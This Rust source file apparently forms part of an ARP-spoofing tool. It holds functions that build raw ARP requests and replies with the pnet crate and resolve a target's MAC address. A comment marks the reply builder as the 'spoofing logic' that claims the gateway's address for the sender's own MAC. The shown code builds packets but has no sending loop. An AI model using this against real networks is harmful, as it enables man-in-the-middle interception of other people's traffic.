use pnet::datalink::{DataLinkReceiver, DataLinkSender};
use pnet::packet::arp::ArpPacket;
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::Packet;
use pnet::util::MacAddr;
use std::net::Ipv4Addr;

pub fn reply_arp_request(
    target_mac: MacAddr,
    target_ip: Ipv4Addr,
    source_mac: MacAddr,
    source_ip: Ipv4Addr,
) -> Option<Vec<u8>> {
    let buffer_size =
        MutableEthernetPacket::minimum_packet_size() + MutableArpPacket::minimum_packet_size();
    let mut buffer = vec![0u8; buffer_size];

    let mut ethernet_packet = MutableEthernetPacket::new(&mut buffer)?;

    ethernet_packet.set_destination(target_mac);
    ethernet_packet.set_source(source_mac);
    ethernet_packet.set_ethertype(EtherTypes::Arp);

    let mut arp_buffer = vec![0u8; MutableArpPacket::minimum_packet_size()];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer)?;

    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperations::Reply);
    // The Payload (The Spoofing Logic)
    arp_packet.set_sender_hw_addr(source_mac); // "The Gateway is at THIS MAC (Ours)"
    arp_packet.set_sender_proto_addr(source_ip);
    arp_packet.set_target_hw_addr(target_mac);
    arp_packet.set_target_proto_addr(target_ip);

    ethernet_packet.set_payload(arp_packet.packet());

    Some(buffer)
}

pub fn build_arp_request(
    target_ip: Ipv4Addr,
    source_mac: MacAddr,
    source_ip: Ipv4Addr,
) -> Option<Vec<u8>> {
    let buffer_size =
        MutableEthernetPacket::minimum_packet_size() + MutableArpPacket::minimum_packet_size();
    let mut buffer = vec![0u8; buffer_size];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut buffer)?;

    ethernet_packet.set_destination(MacAddr::broadcast());
    ethernet_packet.set_source(source_mac);
    ethernet_packet.set_ethertype(EtherTypes::Arp);
    let mut arp_buffer = vec![0u8; MutableArpPacket::minimum_packet_size()];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer)?;
    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);

    arp_packet.set_operation(ArpOperations::Request);
    arp_packet.set_sender_hw_addr(source_mac);
    arp_packet.set_sender_proto_addr(source_ip);

    arp_packet.set_target_hw_addr(MacAddr::zero());
    arp_packet.set_target_proto_addr(target_ip);
    ethernet_packet.set_payload(arp_packet.packet());
    Some(buffer)
}

pub fn resolve_mac(
    tx: &mut Box<dyn DataLinkSender>,
    rx: &mut Box<dyn DataLinkReceiver>,
    target_ip: Ipv4Addr,
    source_mac: MacAddr,
    source_ip: Ipv4Addr,
) -> Option<MacAddr> {
    // Build the Request
    let request_packet = build_arp_request(target_ip, source_mac, source_ip)?;
    // Send it
    tx.send_to(&request_packet, None);
    println!("Sent ARP Request for {}", target_ip);
    // Wait for Reply
    // loop because we might see other unrelated packets first
    loop {
        // Read next packet
        match rx.next() {
            Ok(packet) => {
                use pnet::packet::ethernet::EthernetPacket;

                if let Some(eth) = EthernetPacket::new(packet) {
                    if eth.get_ethertype() == EtherTypes::Arp {
                        if let Some(arp) = ArpPacket::new(eth.payload()) {
                            // Is it a reply AND is it from the target we asked?
                            if arp.get_operation() == ArpOperations::Reply
                                && arp.get_sender_proto_addr() == target_ip
                            {
                                println!("Found MAC: {}", arp.get_sender_hw_addr());
                                return Some(arp.get_sender_hw_addr());
                            }
                        }
                    }
                }
            }
            Err(_) => return None,
        }
    }
}
